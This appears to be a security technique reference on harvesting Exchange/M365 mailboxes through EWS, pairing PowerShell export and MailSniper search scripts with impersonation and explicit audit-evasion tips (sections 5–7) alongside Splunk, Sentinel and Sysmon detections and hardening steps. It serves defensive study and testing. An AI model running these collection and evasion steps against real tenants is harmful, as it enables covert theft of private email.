# [COLLECT-EMAIL-001]: Email Collection via EWS

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-EMAIL-001 |
| **MITRE ATT&CK v18.1** | Email Collection (T1114) / Remote Email Collection (T1114.002) – Exchange/EWS |
| **Tactic** | Collection |
| **Platforms** | M365 (Exchange Online), Exchange Server 2013–2019, Windows client running Outlook/PowerShell |
| **Severity** | High |
| **Technique Status** | PARTIAL (EWS still available with Modern Auth; Basic Auth mostly disabled in M365) |
| **Last Verified** | 2024-09-30 |
| **Affected Versions** | Exchange Online; Exchange Server 2013 CU23, 2016, 2019; Outlook 2016+; Windows 10/11 |
| **Patched In** | N/A – protocol feature; risk mitigated via configuration (modern auth, Conditional Access, EWS application policies) rather than a single patch |
| **Environment** | M365 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY
- **Concept:** This module covers adversarial collection of mailbox data using **Exchange Web Services (EWS)** from Microsoft 365 / Exchange Online. EWS exposes rich APIs (SOAP & Managed API) that allow programmatic access to mailboxes, including searching, reading and exporting complete items and attachments. Attackers abuse EWS with stolen credentials or app registrations to perform **stealthy, scriptable mailbox harvesting** without interactive logon to Outlook or OWA.
- **Attack Surface:** Exchange Online EWS endpoint (`https://outlook.office365.com/EWS/Exchange.asmx`), on‑prem Exchange `/EWS/Exchange.asmx`, service principals with Mail.* or EWS.AccessAsUser.All permissions, and privileged accounts with access to multiple mailboxes or impersonation.
- **Business Impact:** **Loss of confidentiality for entire mailboxes and long‑term intelligence exposure.** An adversary can exfiltrate years of communication (executive mailboxes, legal, finance, incident response), attachments, and contact data, enabling business email compromise (BEC), insider trading, extortion, legal exposure, and long‑term espionage.
- **Technical Context:** EWS access typically manifests as programmatic traffic from unusual user‑agents (for example, custom .NET or PowerShell EWS clients) and abnormal `MailItemsAccessed` or `Export`‑type operations in the unified audit log. Collection can be low‑and‑slow over weeks to remain under alert thresholds. Detection hinges on **centralized logging (Purview, Sentinel, SIEM)** and correlation of sign‑in anomalies, application permissions, and mailbox access patterns.

### Operational Risk
- **Execution Risk:** Medium – EWS is a supported API; misuse rarely causes service disruption, but careless scripted exports can stress throttling policies or trigger account lockouts.
- **Stealth:** Medium/High – Activity is API‑based and often blends with legitimate service traffic, especially when using OAuth with approved enterprise apps. However, modern tenants log rich telemetry (MailItemsAccessed, app IDs, user agents), allowing post‑compromise reconstruction.
- **Reversibility:** Low – Once mail content is exfiltrated, it cannot be revoked. Remediation focuses on access revocation, token/app clean‑up, and incident response rather than undoing data theft.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Microsoft 365 / Exchange Online: secure legacy protocols, restrict programmatic access | Failure to disable or tightly control EWS and legacy auth allows bulk mailbox collection. |
| **DISA STIG** | Microsoft 365 / Exchange Online STIG – auditing, mailbox access controls | Inadequate mailbox audit logging and weak admin/mailbox access violate STIG guidance for SaaS email services. |
| **CISA SCuBA** | M365 Exchange configuration baseline | Over‑permissive service principals and unmonitored EWS access violate recommended secure configurations for cloud email. |
| **NIST 800-53** | AC-2, AC-3, AC-6, AU-2, AU-12 | Weak account management, fine‑grained access control and audit logging around mailbox APIs enable unsanctioned email collection. |
| **GDPR** | Art. 5, Art. 32 | Bulk mailbox theft often includes personal data; failure to implement appropriate technical and organizational measures for email security. |
| **DORA** | Art. 9 – ICT risk management | Unmonitored programmatic access to regulated communications breaks requirements for protecting critical data and monitoring ICT risks. |
| **NIS2** | Art. 21 – Cybersecurity risk‑management measures | Lack of monitoring and control over mailbox APIs used for strategic communications breaches risk‑management obligations. |
| **ISO 27001** | A.5, A.8.12, A.8.16, A.8.23 | Insufficient controls for secure use of SaaS email, logging and monitoring of access to information in electronic messaging. |
| **ISO 27005** | Email compromise / data exfiltration risk scenario | Uncontrolled API access to mailboxes represents a high‑impact information leakage risk requiring explicit treatment.

## 3. TECHNICAL PREREQUISITES
- **Required Privileges:**
  - Minimum: Valid user credentials with a mailbox and EWS enabled.
  - For multi‑mailbox collection: Account with **ApplicationImpersonation** role (on‑prem) or app registration with `full_access_as_app` / `EWS.AccessAsUser.All` or equivalent Graph `Mail.Read` application permissions.
- **Required Access:**
  - Network egress to `outlook.office365.com` (Exchange Online) or on‑prem EWS endpoint over HTTPS (TCP 443).
  - Ability to run PowerShell or a .NET client from an operator workstation or cloud VM.

**Supported Versions:**
- **Exchange / M365:**
  - Exchange Online (current, Modern Auth only – Basic Auth for EWS deprecated).
  - Exchange Server 2013 CU23, 2016, 2019 (EWS enabled by default unless restricted).
- **Windows:**
  - Windows 10, Windows 11, Windows Server 2016–2022 for operator tooling.
- **PowerShell:**
  - PowerShell 5.1+ (Windows) or PowerShell 7+ (cross‑platform) with .NET Framework/Runtime.
- **Other Requirements:**
  - EWS not globally disabled at organization or mailbox level (`EwsEnabled`, `EwsApplicationAccessPolicy`, `EwsBlockList` / `EwsAllowList`).
  - For Modern Auth: Entra ID app registration with appropriate delegated or application permissions and consent.

- **Tools:**
  - [Exchange Web Services Managed API 2.2](https://github.com/officedev/ews-managed-api) (on‑prem / legacy scripts).
  - [MailSniper](https://github.com/dafthack/MailSniper) – PowerShell EWS/OWA search tool.
  - [AADInternals](https://aadinternals.com/aadinternals/) – includes functions for mailbox and token abuse in M365.
  - Native PowerShell `ExchangeOnlineManagement` module for audit/detection.

## 4. ENVIRONMENTAL RECONNAISSANCE

#### Management Station / PowerShell Reconnaissance (Exchange Online)
```powershell
# 1) Connect to Exchange Online
Import-Module ExchangeOnlineManagement
Connect-ExchangeOnline -UserPrincipalName analyst@tenant.onmicrosoft.com

# 2) Check global EWS configuration
Get-OrganizationConfig | Select-Object EwsEnabled, EwsApplicationAccessPolicy, EwsAllowList, EwsBlockList

# 3) Sample: find mailboxes where EWS is explicitly disabled
Get-CASMailbox -ResultSize Unlimited `
  | Where-Object { $_.EwsEnabled -eq $false } `
  | Select-Object UserPrincipalName, EwsEnabled

# 4) Identify admin / high-value mailboxes
Get-Mailbox -RecipientTypeDetails UserMailbox `
  | Where-Object { $_.DisplayName -match 'CEO|CFO|Security|Legal' } `
  | Select-Object DisplayName, UserPrincipalName
```

**What to Look For:**
- `EwsEnabled` set to `True` globally with **no** restrictive `EwsApplicationAccessPolicy`.
- Lack of `EwsBlockList` or overly broad `EwsAllowList` including generic or third‑party apps.
- High‑value mailboxes with default settings (no additional mailbox‑level restrictions).

**Version Note:**
- On **Exchange Online**, org‑wide EWS policy is controlled via `Get/Set-OrganizationConfig`.
- On **on‑prem Exchange 2013–2019**, you may also rely on `Get-WebServicesVirtualDirectory` and CAS mailbox policies.

**Command (Exchange 2013–2019 on‑prem):**
```powershell
# Run in Exchange Management Shell on an Exchange server
Get-WebServicesVirtualDirectory | fl Identity, InternalUrl, ExternalUrl, BasicAuthentication, OAuthAuthentication

Get-ClientAccessService | Select-Object Name, Fqdn, IsClientAccessServer
```

**Command (Exchange Online):**
```powershell
Get-OrganizationConfig | Select-Object EwsEnabled, Ews*Policy*
Get-CASMailbox -ResultSize 20 | Select-Object UserPrincipalName,EwsEnabled,EWSSAllowOutlook
```

#### Linux/Bash / CLI Reconnaissance
```bash
# Test connectivity to Exchange Online EWS endpoint
curl -I https://outlook.office365.com/EWS/Exchange.asmx

# Simple banner check against on-prem Exchange
curl -k -I https://exchange.corp.example.com/EWS/Exchange.asmx
```

**What to Look For:**
- HTTP 200/401 responses confirming EWS is reachable over the internet/VPN.
- TLS configuration (legacy protocols / weak ciphers on on‑prem servers).
- Reverse proxies or WAF headers that might impact logging or detection.

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1 – PowerShell with EWS Managed API (Single Mailbox Export)

**Supported Versions:**
- Exchange Online (Modern Auth with additional OAuth helper modules).
- Exchange 2013–2019 (Basic or Integrated auth depending on configuration).

#### Step 1: Load EWS Managed API and Authenticate
**Objective:** Obtain an authenticated `ExchangeService` object against the target mailbox.

**Version Note:**
- **On‑prem / legacy labs** often still use Basic Auth; **Exchange Online** requires OAuth (MSAL‑based or similar helper as per Microsoft guidance).

**Command (on‑prem / lab – Basic Auth example):
```powershell
# Path to the EWS Managed API DLL
$ewsDllPath = 'C:\Program Files\Microsoft\Exchange\Web Services\2.2\Microsoft.Exchange.WebServices.dll'
Add-Type -Path $ewsDllPath

$service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService(`
    [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2013_SP1)

# Basic credentials (NOT valid on hardened M365 tenants)
$creds = New-Object System.Net.NetworkCredential('user@corp.local','P@ssw0rd!')
$service.Credentials = $creds
$service.AutodiscoverUrl('user@corp.local', { $true })
```

**Command (Exchange Online – OAuth with MSAL token pre‑obtained):**
```powershell
# Assume you obtained an OAuth access token for EWS.AccessAsUser.All
# using MSAL / Azure AD app registration as per Microsoft Learn guidance.

Add-Type -Path 'C:\Tools\EWS\Microsoft.Exchange.WebServices.dll'
$service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService

$accessToken = $env:EWS_OAUTH_TOKEN   # supplied by separate auth helper
$service.Credentials = New-Object Microsoft.Exchange.WebServices.Data.OAuthCredentials($accessToken)
$service.Url = [Uri] 'https://outlook.office365.com/EWS/Exchange.asmx'
$service.ImpersonatedUserId = New-Object `
  Microsoft.Exchange.WebServices.Data.ImpersonatedUserId(`
    [Microsoft.Exchange.WebServices.Data.ConnectingIdType]::SmtpAddress,
    'victim.user@tenant.onmicrosoft.com')
```

**Expected Output:**
- No direct output; subsequent folder binds and item queries succeed without exceptions.

**What This Means:**
- The operator now has programmatic access to the mailbox via EWS and (optionally) can impersonate other users if the role permits.

**OpSec & Evasion:**
- Use Modern Auth and an app registration that resembles legitimate backup/archiving tools.
- Restrict thread count and page size to avoid throttling and anomalous spikes in `MailItemsAccessed` audit events.
- Consider using a dedicated outbound IP that already generates SaaS traffic for the tenant.

**Troubleshooting:**
- **Error:** `401 Unauthorized` or OAuth failures.
  - **Cause:** Incorrect permissions or Basic Auth disabled.
  - **Fix:** Use an Entra ID app registration with proper EWS/Graph permissions and consent.
- **Error:** `Autodiscover blocked`.
  - **Cause:** Autodiscover disabled externally.
  - **Fix:** Set `service.Url` explicitly to the known EWS endpoint.

**References & Proofs:**
- Microsoft Learn – *Export items by using EWS in Exchange*.
- Microsoft Learn – *Authenticate an EWS application by using OAuth*.
- GitHub – *What to do with EWS Managed API PowerShell scripts after Basic Auth is disabled*.

#### Step 2: Enumerate and Export Mail Items
**Objective:** Export mailbox items to `.eml` files for later exfiltration or offline analysis.

**Command:**
```powershell
$exportRoot = 'C:\EWSExport'
New-Item -ItemType Directory -Path $exportRoot -Force | Out-Null

# Bind to Inbox (or any folder)
$inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind(`
    $service,
    [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox)

# Page through items
$view = New-Object Microsoft.Exchange.WebServices.Data.ItemView(100)
$view.PropertySet = [Microsoft.Exchange.WebServices.Data.PropertySet]::IdOnly

$more = $true
while ($more) {
    $results = $service.FindItems($inbox.Id, $view)

    foreach ($item in $results.Items) {
        $propSet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet(`
            [Microsoft.Exchange.WebServices.Data.EmailMessageSchema]::MimeContent)
        $email = [Microsoft.Exchange.WebServices.Data.EmailMessage]::Bind($service, $item.Id, $propSet)

        $fileName = Join-Path $exportRoot ("{0}.eml" -f $email.Id.UniqueId.Replace('/', '_'))
        [System.IO.File]::WriteAllBytes($fileName, $email.MimeContent.Content)
    }

    $more = $results.MoreAvailable
    if ($more) { $view.Offset += $results.Items.Count }
}
```

**Expected Output:**
- Directory populated with `.eml` files containing full RFC 822 mail content.

**What This Means:**
- The adversary has achieved complete logical export of selected mailbox items in a portable format that can later be imported into Outlook or analyzed with tooling.

**OpSec & Evasion:**
- Limit the date range (for example, only last 30 days) to minimize anomalies.
- Randomize sleep intervals between page fetches to reduce recognizable patterns.

**Troubleshooting:**
- **Error:** `The property MimeContent is not loaded.`
  - **Cause:** Incorrect `PropertySet`.
  - **Fix:** Ensure `EmailMessageSchema.MimeContent` is explicitly requested.
- **Error:** `ErrorAccessDenied` for some mailboxes.
  - **Cause:** Missing impersonation or access rights.
  - **Fix:** Confirm `ApplicationImpersonation` (on‑prem) or app permissions.

**References & Proofs:**
- Microsoft Learn – *Use the MIME stream to export into common file formats*.
- Community scripts – *PowerShell and EWS Managed API mailbox export*.

### METHOD 2 – MailSniper PowerShell Module (Search and Collection)

**Supported Versions:**
- Exchange Online and Exchange 2013–2019 with EWS enabled.

#### Step 1: Self‑Mailbox Search via EWS
**Objective:** Search the current user mailbox for sensitive terms and export matching messages.

**Command:**
```powershell
# Bypass execution policy only in lab environments
powershell.exe -ExecutionPolicy Bypass -File .\MailSniper.ps1

# In an interactive PowerShell session after importing MailSniper
Import-Module .\MailSniper.ps1

Invoke-SelfSearch -Mailbox user@tenant.onmicrosoft.com `
  -Terms '*password*','*creds*','*vpn*' `
  -Verbose
```

**Expected Output:**
- Console output and CSV with details for all matching messages (subject, sender, date, etc.).

**What This Means:**
- The adversary can quickly triage a compromised mailbox for credentials, access details and other high‑value content.

**OpSec & Evasion:**
- Reduce `-MailsPerUser` and limit folders to minimize audit noise.
- Use a user‑agent that mimics Outlook when modifying underlying EWS client code.

**References & Proofs:**
- Black Hills – *Introducing MailSniper – a tool for searching every user's email for sensitive data*.
- GitHub – `dafthack/MailSniper` repository.

#### Step 2: Global Mailbox Search with Impersonation
**Objective:** Abuse `ApplicationImpersonation` to search all mailboxes for sensitive content via EWS.

**Command (simplified example):**
```powershell
# After importing MailSniper and authenticating as an Exchange admin
Invoke-GlobalMailSearch `
  -ImpersonationAccount svc_ews_impersonation `
  -AutoDiscoverEmail admin@tenant.onmicrosoft.com `
  -MailsPerUser 200 `
  -Terms '*password*','*wire transfer*','*confidential*' `
  -OutputCsv global-email-search.csv
```

**Expected Output:**
- `global-email-search.csv` containing matches from many user mailboxes.

**What This Means:**
- This is large‑scale intelligence collection across the tenant and aligns directly with T1114.002 Remote Email Collection.

**Troubleshooting:**
- Validate the impersonation role assignment:
  ```powershell
  New-ManagementRoleAssignment -Name 'EWS-Impersonation' `
    -Role 'ApplicationImpersonation' `
    -User svc_ews_impersonation
  ```

**References & Proofs:**
- MailSniper documentation & field manual.

## 6. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team
- **Atomic Test ID:** T1114.002 – Email Collection: Remote Email Collection.
- **Test Name:** Remote email collection via programmatic access.
- **Description:** Simulates an adversary accessing remote mailboxes via Exchange Web Services or similar APIs to enumerate and retrieve email content.
- **Supported Versions:** Windows with access to Exchange / Office 365 and PowerShell.
- **Command:**
  ```powershell
  Invoke-AtomicTest T1114.002 -TestNumbers 1
  ```
- **Cleanup Command:**
  ```powershell
  Invoke-AtomicTest T1114.002 -TestNumbers 1 -Cleanup
  ```
- **Reference:** Atomic Red Team – T1114.002 Remote Email Collection.

## 7. TOOLS & COMMANDS REFERENCE

#### Exchange Web Services Managed API 2.2

**Version:** 2.2 (last published by Microsoft, now feature‑frozen).
**Minimum Version:** 2.0.
**Supported Platforms:** Windows with .NET Framework 4.x; works against Exchange 2010–2019 and Exchange Online.

**Version-Specific Notes:**
- 2.x: Full support for Exchange 2013 SP1 features; deprecated for new development in favor of Graph.
- Exchange Online: Supported but Microsoft recommends migrating new apps to Graph; EWS remains for backward‑compatibility.

**Installation:**
```powershell
# Example – manual installation
# 1) Download EWS Managed API 2.2 and extract DLL.
# 2) Place DLL under C:\Tools\EWS or Program Files.

Add-Type -Path 'C:\Tools\EWS\Microsoft.Exchange.WebServices.dll'
```

**Usage:**
```powershell
$service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService
$service.Credentials = New-Object Microsoft.Exchange.WebServices.Data.OAuthCredentials($accessToken)
$service.Url = [Uri] 'https://outlook.office365.com/EWS/Exchange.asmx'

$inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind(
    $service,
    [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox)
```

#### Script (One-Liner)
```powershell
# Quick EWS connectivity check (lab only)
Add-Type -Path 'C:\Tools\EWS\Microsoft.Exchange.WebServices.dll'; `
$svc = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService; `
$svc.Credentials = New-Object System.Net.NetworkCredential('user@corp.local','P@ssw0rd!'); `
$svc.AutodiscoverUrl('user@corp.local', { $true }); `
[Microsoft.Exchange.WebServices.Data.Folder]::Bind($svc,[Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox) | Out-Null; `
Write-Host 'EWS access OK'
```

## 8. SPLUNK DETECTION RULES

#### Rule 1: Suspicious EWS Mailbox Export / Bulk Access
**Rule Configuration:**
- **Required Index:** `o365` or `m365` (where Office 365 Management Activity API logs are stored).
- **Required Sourcetype:** `o365:management:activity` or equivalent.
- **Required Fields:** `Workload`, `Operation`, `UserId`, `ClientIP`, `UserAgent`, `Parameters` / `AuditData`.
- **Alert Threshold:** More than 1,000 `MailItemsAccessed` or `Export`‑like operations for a single user or app within 30 minutes.
- **Applies To Versions:** All tenants with Unified Audit Log ingestion.

**SPL Query:**
```spl
index=o365 sourcetype=o365:management:activity Workload="Exchange"
| eval op=coalesce(Operation, operation)
| where op IN ("MailItemsAccessed","UpdateInboxRules","New-MailboxExportRequest","Export-Report","Search-Mailbox","New-ComplianceSearchAction")
| stats count AS op_count,
        values(op) AS operations,
        values(UserAgent) AS user_agents,
        values(ClientIP) AS client_ips
  BY UserId, UserKey, RecordType, object, appid
| where op_count > 1000
```

**What This Detects:**
- High‑volume programmatic access to mailbox items, mailbox export operations, or administrative search/export actions linked to a single account or app.
- Combined patterns (MailItemsAccessed + New‑ComplianceSearchAction + export) associated with mass mailbox exfiltration.

**Manual Configuration Steps:**
1. Log into Splunk Web and open **Search & Reporting**.
2. Paste and tune the SPL query to your index/sourcetype naming.
3. Click **Save As** → **Alert**.
4. Configure the trigger condition (for example, `op_count > 1000`).
5. Set the schedule (for example, run every 15 minutes over the last 60 minutes).
6. Add actions (email to SOC, webhook to SOAR, ticket creation).

#### False Positive Analysis
- **Legitimate Activity:**
  - Compliance/eDiscovery exports.
  - Backup/archive products using EWS.
- **Benign Tools:**
  - Internal migration utilities or journaling/archiving gateways.
- **Tuning:**
  - Filter on known good apps or service accounts by `UserId` or `appid`.
  - Maintain an allow‑list of approved backup vendors.

## 9. MICROSOFT SENTINEL DETECTION

#### Query 1: Excessive MailItemsAccessed or Export Activity (EWS / Programmatic Access)
**Rule Configuration:**
- **Required Table:** `OfficeActivity` or `AuditLogs` depending on connector.
- **Required Fields:** `Operation`, `UserId`, `ClientIP`, `UserAgent`, `AuditData`.
- **Alert Severity:** High.
- **Frequency:** Every 15 minutes.
- **Applies To Versions:** All Exchange Online tenants with unified audit log collection.

**KQL Query:**
```kusto
OfficeActivity
| where OfficeWorkload == "Exchange"
| where Operation in ("MailItemsAccessed", "New-MailboxExportRequest", "New-ComplianceSearch", "New-ComplianceSearchAction")
| extend UserAgent = tostring(parse_json(AuditData).UserAgent),
         ClientIP  = tostring(parse_json(AuditData).ClientIP),
         AppId     = tostring(parse_json(AuditData).AppId)
| summarize Count = count(),
            Operations = make_set(Operation),
            IPs        = make_set(ClientIP),
            Agents     = make_set(UserAgent)
  by UserId, AppId, bin(TimeGenerated, 30m)
| where Count > 1000
```

**What This Detects:**
- High‑volume mailbox access or export operations associated with EWS/Graph clients.
- Potential mass export of mailbox data by a compromised user or service principal.

**Manual Configuration Steps (Azure Portal):**
1. Go to **Azure Portal** → **Microsoft Sentinel**.
2. Select the workspace → **Analytics**.
3. Click **+ Create** → **Scheduled query rule**.
4. In **General**, name the rule `Exchange – Suspicious EWS Mailbox Export` and set severity to **High**.
5. In **Set rule logic**, paste the KQL query, run every 15 minutes, look back 60 minutes.
6. Enable incident creation and configure entity mappings (User, IP, Cloud Application).
7. Review and create the rule.

**Manual Configuration Steps (PowerShell):**
```powershell
Connect-AzAccount
$rg = 'Sentinel-RG'
$ws = 'Sentinel-Workspace'

$kql = @'
<Insert KQL query from above>
'@

New-AzSentinelAlertRule -ResourceGroupName $rg -WorkspaceName $ws `
  -DisplayName 'Exchange – Suspicious EWS Mailbox Export' `
  -Severity High `
  -Query $kql `
  -Enabled $true
```

## 10. WINDOWS EVENT LOG MONITORING

**Event ID: 4624 (An account was successfully logged on)**
- **Log Source:** Security (Exchange servers / admin workstations).
- **Trigger:** Successful logon for service accounts used for EWS collection or admin accounts that later perform EWS access.
- **Filter:** Service accounts performing interactive logons instead of service‑type logons.
- **Applies To Versions:** Windows Server 2016–2022, Windows 10/11.

**Manual Configuration Steps (Group Policy):**
1. Open **gpmc.msc**.
2. Navigate to **Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration**.
3. Under **Logon/Logoff**, enable **Audit Logon** and **Audit Logoff** for Success and Failure.
4. Link the GPO to OU(s) containing Exchange servers and admin workstations.
5. Run `gpupdate /force` or wait for policy refresh.

**Manual Configuration Steps (Local Policy):**
1. Open **secpol.msc**.
2. Go to **Advanced Audit Policy Configuration → System Audit Policies → Logon/Logoff**.
3. Enable **Audit Logon** with Success and Failure.
4. Apply and close.

## 11. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13+
**Supported Platforms:** Windows Server 2016–2022, Windows 10/11.

```xml
<RuleGroup name="EWS Mail Collection" groupRelation="or">
  <ProcessCreate onmatch="include">
    <Image condition="contains">powershell.exe</Image>
    <CommandLine condition="contains">Microsoft.Exchange.WebServices</CommandLine>
  </ProcessCreate>
  <ProcessCreate onmatch="include">
    <Image condition="contains">pwsh.exe</Image>
    <CommandLine condition="contains">MailSniper.ps1</CommandLine>
  </ProcessCreate>
</RuleGroup>
```

**Manual Configuration Steps:**
1. Download Sysmon from Microsoft Sysinternals.
2. Create or extend your `sysmon-config.xml` with the rule group above.
3. Install or update Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Validate events in **Microsoft-Windows-Sysmon/Operational** log.

## 12. MICROSOFT DEFENDER FOR CLOUD / MICROSOFT 365 DEFENDER

#### Detection Alerts
**Alert Name:** Suspicious email exfiltration via EWS or third‑party app (naming varies by product).
- **Severity:** High.
- **Description:** Detects abnormal patterns of mailbox access/export, especially from unusual locations, devices or apps.
- **Applies To:** Tenants with Microsoft 365 Defender / Defender for Office 365 Plan 2 and Exchange Online.
- **Remediation:**
  - Investigate the app/service principal and revoke tokens.
  - Disable or restrict EWS for the impacted account(s).
  - Rotate credentials and apply stricter Conditional Access.

**Manual Configuration Steps (Enable Microsoft 365 Defender signals):**
1. Go to **security.microsoft.com**.
2. Navigate to **Settings → Endpoints / Email & Collaboration**.
3. Ensure **Exchange Online** integration and **Advanced hunting** are enabled.
4. Confirm **Alert policies** for suspicious email exfiltration are active.

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: MailItemsAccessed and Export‑like Operations
```powershell
Connect-ExchangeOnline

$start = (Get-Date).AddDays(-7)
$end   = Get-Date

$records = Search-UnifiedAuditLog -StartDate $start -EndDate $end `
  -Operations MailItemsAccessed, New-MailboxExportRequest, New-ComplianceSearchAction `
  -ResultSize 5000

$records | Select-Object CreationDate, UserIds, Operation, AuditData `
  | Export-Csv 'C:\Audit\EWS-Mail-Collection.csv' -NoTypeInformation
```
- **Operation:** `MailItemsAccessed`, `New-MailboxExportRequest`, `New-ComplianceSearch`, `New-ComplianceSearchAction`.
- **Workload:** `Exchange`.
- **Details:** Parse `AuditData` JSON for mailboxes, folders, client IP, user agent and app IDs.
- **Applies To:** M365 E3/E5 (Unified Audit Log enabled).

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Open **Microsoft Purview compliance portal**.
2. Go to **Audit**.
3. If prompted, click **Turn on auditing**.
4. Wait up to 24 hours for data to become available.

**Manual Configuration Steps (Search Audit Logs):**
1. In **Audit**, select **Search**.
2. Set date range (for example, last 7 days).
3. Under **Activities**, include `MailItemsAccessed`, `New-MailboxExportRequest`, `New-ComplianceSearchAction`.
4. Optionally filter by specific user(s) or app IDs.
5. Run the search and export results for offline analysis.

## 14. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

* **Disable or tightly restrict EWS where not required.**
  **Applies To Versions:** Exchange Online; Exchange 2013–2019.
  
  **Manual Steps (Exchange Online – organization level):**
  1. Connect to Exchange Online PowerShell.
  2. Run `Get-OrganizationConfig | Select EwsEnabled, EwsApplicationAccessPolicy`.
  3. Set `EwsEnabled` to `False` if EWS is not required, or configure `EwsApplicationAccessPolicy` to `EnforceAllowList` and define an `EwsAllowList` of approved apps.
  
  **Manual Steps (Mailbox level):**
  1. Identify sensitive mailboxes (executives, security, legal).
  2. Run `Set-CASMailbox user@domain -EwsEnabled:$false` if interactive EWS access is not needed.

* **Harden app registrations and service principals.**
  **Manual Steps (Entra ID Portal):**
  1. Go to **Entra ID → App registrations**.
  2. Review apps with `full_access_as_app`, `EWS.AccessAsUser.All`, or broad `Mail.Read` application permissions.
  3. Remove unused apps, reduce permissions to least privilege, and require admin consent workflows.

#### Priority 2: HIGH

* **Conditional Access for programmatic access.**
  **Manual Steps:**
  1. In **Entra ID → Security → Conditional Access**, create a new policy.
  2. Target **All users** (exclude break‑glass) and cloud apps **Office 365 Exchange Online**.
  3. Under **Conditions → Client apps**, include **Mobile apps and desktop clients** and **Other clients**; evaluate controls for legacy clients.
  4. Under **Access controls → Grant**, require compliant/hybrid‑joined devices and block access from risky or unmanaged locations.

* **RBAC/ABAC:**
  - Remove unnecessary `ApplicationImpersonation` assignments.
  - Ensure only dedicated, monitored service accounts can impersonate mailboxes.

#### Access Control & Policy Hardening

* **Exchange role hardening:** Limit `Discovery Management`, `Organization Management` and eDiscovery roles to a minimal set of users.
* **Policy Config:** Implement PBAC‑style restrictions using sensitivity labels and DLP policies to prevent export of highly classified email even when accessed via EWS.

#### Validation Command (Verify Fix)
```powershell
# List mailboxes with EWS still enabled
Get-CASMailbox -ResultSize Unlimited `
  | Where-Object { $_.EwsEnabled -eq $true } `
  | Select-Object UserPrincipalName
```
**Expected Output (If Secure):**
- Only service accounts or explicitly approved users retain EWS access.

**What to Look For:**
- No generic users with EWS access in high‑risk roles.
- `EwsApplicationAccessPolicy` set to `EnforceAllowList` with a short allow‑list.

## 15. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)
* **Files:**
  - `.eml`, `.msg` or large `.zip` archives under `C:\EWSExport` or other staging paths on admin/operator hosts.
* **Registry / Configuration:**
  - Recently added or modified Entra ID app registrations with high‑privilege EWS / Mail permissions.
* **Network:**
  - Large outbound HTTPS traffic from admin workstations or unusual IPs to `outlook.office365.com`.

#### Forensic Artifacts
* **Disk:**
  - Local export directories containing mail dumps.
  - PowerShell scripts or tools (MailSniper.ps1, EWS DLLs) in operator profiles.
* **Memory:**
  - PowerShell processes with loaded `Microsoft.Exchange.WebServices` assemblies.
* **Cloud:**
  - Unified audit log events for `MailItemsAccessed`, `New-ComplianceSearch`, `New-ComplianceSearchAction`, `New-MailboxExportRequest`.
* **MFT/USN Journal:**
  - Creation of thousands of `.eml` files over short time windows.

#### Response Procedures
1. **Isolate:**
   ```powershell
   # Example – disable compromised account
   Set-AzureADUser -ObjectId user@tenant.onmicrosoft.com -AccountEnabled $false
   ```
   - In the Azure Portal, revoke sign‑in sessions and invalidate refresh tokens for the impacted user and any suspicious app registrations.

2. **Collect Evidence:**
   ```powershell
   # Export relevant audit records
   $start = (Get-Date).AddDays(-7)
   $end   = Get-Date
   Search-UnifiedAuditLog -StartDate $start -EndDate $end -UserIds user@tenant.onmicrosoft.com `
     | Export-Csv 'C:\Evidence\UnifiedAuditLog.csv' -NoTypeInformation
   ```

3. **Remediate:**
   - Remove malicious or unused Entra ID app registrations.
   - Remove `ApplicationImpersonation` and other elevated roles from compromised accounts.
   - Rotate credentials and enforce stronger Conditional Access.

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | IA-PHISH-001 / OAuth consent grant | Phishing or malicious OAuth app used to obtain mailbox tokens. |
| **2** | **Privilege Escalation** | PE-ACCTMGMT-001 / App Registration Escalation | Attacker upgrades app permissions to full mailbox access. |
| **3** | **Current Step** | **COLLECT-EMAIL-001 – Email Collection via EWS** | Programmatic access to mailbox contents via EWS. |
| **4** | **Persistence** | REALWORLD-001 / Email forwarding rules | Forwarding rules or long‑lived refresh tokens maintain access. |
| **5** | **Impact** | CHAIN-003 / Token Theft to Data Exfiltration | Mass exfiltration of mailboxes and sensitive attachments. |

## 17. REAL-WORLD EXAMPLES

#### Example 1: APT29 / SolarWinds – Remote Mailbox Collection
- **Target:** US government agencies and enterprises using Microsoft 365.
- **Timeline:** 2019–2020.
- **Technique Status:** APT29 used compromised Entra ID identities and service principals to access targeted mailboxes in Exchange Online, including via programmatic APIs (Graph/EWS) for bulk email collection.
- **Impact:** Long‑term espionage, theft of sensitive communications and incident response details.
- **Reference:** Public reporting on SolarWinds compromise and follow‑on M365 intrusions (MITRE T1114.002, T1098.002).

#### Example 2: HAFNIUM and other actors abusing Exchange EWS
- **Target:** Global organizations using on‑prem Exchange and hybrid environments.
- **Timeline:** 2020–2021.
- **Technique Status:** After compromising Exchange servers via vulnerabilities, actors used EWS to export mailboxes for exfiltration, leveraging service‑side APIs rather than client protocols.
- **Impact:** Exposure of legal, policy and executive communications with downstream regulatory and reputational damage.
- **Reference:** MITRE ATT&CK T1114 / T1114.002, multiple vendor incident response reports.

---